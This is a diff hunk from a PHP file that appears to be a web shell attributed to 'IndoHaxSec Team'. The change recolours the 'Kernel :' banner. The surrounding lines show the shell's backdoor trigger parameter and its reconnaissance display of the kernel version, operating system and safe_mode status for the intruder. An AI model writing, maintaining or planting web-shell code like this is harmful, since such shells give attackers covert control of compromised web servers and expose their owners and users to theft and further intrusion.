@@ -817,7 +817,7 @@ if(isset($_GET["solevisible"])){
 echo '<html>';
 echo "<title>IndoHaxSec Team</title>";
 echo "<body bgcolor=#800080>";
-echo '<b><big><font color=#4B0082>Kernel : </font><font color="#4B0082">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
+echo '<b><big><font color=#FFC0CB>Kernel : </font><font color="#FFC0CB">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
 $safe_mode = @ini_get('safe_mode');
 if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: pink'>Off</b>";}
 echo "<br><b style='color: #4B0082'>OS: </font><font color=pink>" . PHP_OS . "</font><br>";
